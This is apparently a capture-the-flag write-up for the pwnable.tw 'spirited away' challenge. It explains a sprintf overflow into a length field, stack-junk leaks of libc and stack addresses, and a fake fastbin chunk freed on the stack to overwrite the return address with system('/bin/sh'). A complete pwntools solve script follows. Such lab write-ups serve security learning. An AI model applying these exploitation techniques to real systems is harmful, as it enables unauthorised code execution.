# pwnable.tw - spirited away

Original challenge link: https://pwnable.tw/challenge/#22

##  Overview

It asks for a few details regarding name, reason for coming, and comments about movie. It stores the name on heap, but stores rest of data on stack. 

Stack Layout (relative to EBP) -
```
-0xe8 = comment_count_snprintf
-0xb0 = comment_len
-0xac = reason_len
-0xa8 = comment_buff
-0x58 = age
-0x54 = nameptr
-0x50 = reason_buff
 0x0  = saved EBP
 0x4  = saved EIP
```

## Vulnerability
Upon analyzing, i noticed that reason buffer already had some stack junk present in it, including libc addresses and stack addresses. Since printf prints till first null byte, we can carefully set reason to just end before a useful pointer and leak info.

Now onto some sort of overflow, there is no overflow in reason/comment buffer. But, focus on this line - 
```c
sprintf(&comment_count_snprintf, "%d comment so far. We will review them as soon as we can", count);
```
EBP-0xe8 is only 0x38 bytes, and this string is 38 bytes long IF the comment count is only single digit. As soon as comment count hits double digits, snprintf will overflow and write last byte at EBP-0xb0, which is comment_len. comment_len is used to read both name and comment, so we cant pass anything to those now. But if we take comment count to >= 100, 'n' will also overflow into comment_len, making the new comment len '0x6e'. This is big, cuz with this, we can overflow the 0x50 byte comment buffer and 0x38 byte malloc'd heap chunk.



## Exploit
First we leak libc and stack addresses - 
```py
p.sendlineafter(b"name: ", b"a")
p.sendlineafter(b"age: ", b"1")
p.sendafter(b"movie? ", b"A"*23+b"#") #reason buffer
p.sendlineafter(b"comment: ", b"a")
p.recvuntil(b"#")
libc.address = u32(p.recv(4)) - 0x675e7
print(hex(libc.address))

p.sendlineafter(b"<y/n>: ", b"y")
p.sendlineafter(b"name: ", b"a")
p.sendlineafter(b"age: ", b"1")
p.sendafter(b"movie? ", b"A"*0x36+b"#!") #reason buffer
p.sendlineafter(b"comment: ", b"a")

p.recvuntil(b"#!")
ebp = u32(p.recv(4)) - 0x20
print(hex(ebp))
```
We are just carefuly filling the reason buffer till just behind useful data, and adjusting for correct offsets.

Now that its done, we fill it till 100 comments - 
```py
for i in range(8):
    p.sendlineafter(b"<y/n>: ", b"y")
    p.sendlineafter(b"name: ", b"a")
    p.sendlineafter(b"age: ", b"1")
    p.sendafter(b"movie? ", b"A")
    p.sendlineafter(b"comment: ", b"a")

for i in range(90):
    p.sendlineafter(b"<y/n>: ", b"y")
    #p.sendlineafter(b"name: ", b"a")
    p.sendlineafter(b"age: ", b"1")
    p.sendlineafter(b"movie? ", b"A")
    #p.sendlineafter(b"comment: ", b"a")
```
After 10th comment it can't accept name and comment, so we commented those out. After this, the comment_len is 0x6e.

We can overflow name and reason buffer, but we can't overflow reason buffer (can't overwrite reason_len). So we can't touch the saved EIP/ret address. 

Lets see what we can overwrite by overflowing comment_buff - 
```
EBP-0xa8 = comment_buff
EBP-0x58 = age
EBP-0x54 = nameptr
EBP-0x50 = reason_buff
```
So we can completely overwrite age and nameptr. Age is just printed through %d in printf, but, free(nameptr) is called at end of every loop. So we can free whatever address we want to.

The goal is to free an interesting address of size 0x3c, such that when malloc(0x3c) is called in next loop, it gets our fake address. However this has a major contraint, the address we are freeing has to have a valid chunk. Hence we should already have write primitive on that address. Doesn't make sense?

Now recall that although malloc calls (0x3c), which returns a chunk of size 0x40, it reads comment_len number of bytes there. Which means we neeed to create a fake chunk of size 0x40, but we can write 0x6e bytes there.

The perfect target for this is reason_buffer. It sits directly behind saved EBP and EIP. Lets see the structure of our fake chunk - 

|addr|content|description|
|----|-------|-----------|
|reason_buff|p32(0)|padding just for alignment. can be anything.|
|reason_buff+4|p32(0x40)|setting chunk size as 0x40|
|reason_buff+8|b"A"*0x3c|junk chunk content. again can set 0x3c bytes to anything|
|reason_buff+0x44|p32(0x20)|glibc checks the size of next chunk if its valid or not so we can set any reasonable chunk size. |

The above in python - 
```py
p.sendlineafter(b"<y/n>: ", b"y")
p.sendlineafter(b"name: ", b"a")
p.sendlineafter(b"age: ", b"1")
p.sendafter(b"movie? ", p32(0)+ p32(0x40)+ b"A"*0x3c+p32(0x20))
p.sendafter(b"comment: ", b"a"*0x54 + p32(ebp-0x50+8))
```
We overflowed the comment, and just wrote comment_addr+8 to name_ptr(plus 8 was to adjust for metadata).

Now if we free it, comment_addr+8 goes into 0x40 size fastbin. Then in next malloc, that address is returned, and whatever we write in name, it gets written there. We see that 0x50-8 bytes will touch saved EBP, and 0x50-4 will touch saved EIP. With filler bytes till there, we overwrite ret address with system() and write parameter as a pointer to comment_buff to which we write /bin/sh.

```py
p.sendlineafter(b"<y/n>: ", b"y")
p.sendlineafter(b"name: ", flat(
    b"A"*0x48,
    b"B"*4, #ebp
    p32(libc.sym.system), #eip
    p32(0), #filler ret addr
    p32(ebp-0xa8) #comment buff
))
p.sendlineafter(b"age: ", b"1")
p.sendafter(b"movie? ", b"a")
p.sendafter(b"comment: ", b"/bin/sh;")
```

Now exiting survey function will spawn a shell!!



## Solve Script
```py
from pwn import *
import time
exe = ELF("./spirited_away_patched")
libc = ELF("./libc_32.so.6")

context.binary = exe
context.log_level = 'debug'
context.terminal = ['wt.exe', 'wsl.exe', '-d', 'kali-linux']

def conn():
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10204)
    env = {"LD_PRELOAD": libc.path}
    r = None
    if args.GDB:
        r = process([exe.path], env=env)
        gdb.attach(r)
        time.sleep(2)
    else:
        r = process([exe.path])
    return r

p = conn()
p.sendlineafter(b"name: ", b"a")
p.sendlineafter(b"age: ", b"1")
p.sendafter(b"movie? ", b"A"*23+b"#")
p.sendlineafter(b"comment: ", b"a")

p.recvuntil(b"#")
libc.address = u32(p.recv(4)) - (0xf7e0e5e7- 0xf7da7000)
print(hex(libc.address))


p.sendlineafter(b"<y/n>: ", b"y")
p.sendlineafter(b"name: ", b"a")
p.sendlineafter(b"age: ", b"1")
p.sendafter(b"movie? ", b"A"*0x36+b"#!")
p.sendlineafter(b"comment: ", b"a")

p.recvuntil(b"#!")
ebp = u32(p.recv(4)) - 0x20
print(hex(ebp))


for i in range(8):
    p.sendlineafter(b"<y/n>: ", b"y")
    p.sendlineafter(b"name: ", b"a")
    p.sendlineafter(b"age: ", b"1")
    p.sendafter(b"movie? ", b"A")
    p.sendlineafter(b"comment: ", b"a")

for i in range(90):
    p.sendlineafter(b"<y/n>: ", b"y")
    #p.sendlineafter(b"name: ", b"a")
    p.sendlineafter(b"age: ", b"1")
    p.sendlineafter(b"movie? ", b"A")
    #p.sendlineafter(b"comment: ", b"a")


p.sendlineafter(b"<y/n>: ", b"y")
p.sendlineafter(b"name: ", b"a")
p.sendlineafter(b"age: ", b"1")
p.sendafter(b"movie? ", p32(0)+ p32(0x40)+ b"A"*0x3c+p32(0x20))
p.sendafter(b"comment: ", b"a"*0x54 + p32(ebp-0x50+8))
p.sendlineafter(b"<y/n>: ", b"y")
p.sendlineafter(b"name: ", flat(
    b"A"*0x48,
    b"B"*4, #ebp
    p32(libc.sym.system),
    p32(0),
    p32(ebp-0xa8) #comment buff
))
p.sendlineafter(b"age: ", b"1")
p.sendafter(b"movie? ", b"a")
p.sendafter(b"comment: ", b"/bin/sh;")

p.sendlineafter(b"<y/n>: ", b"n")
p.interactive() 
```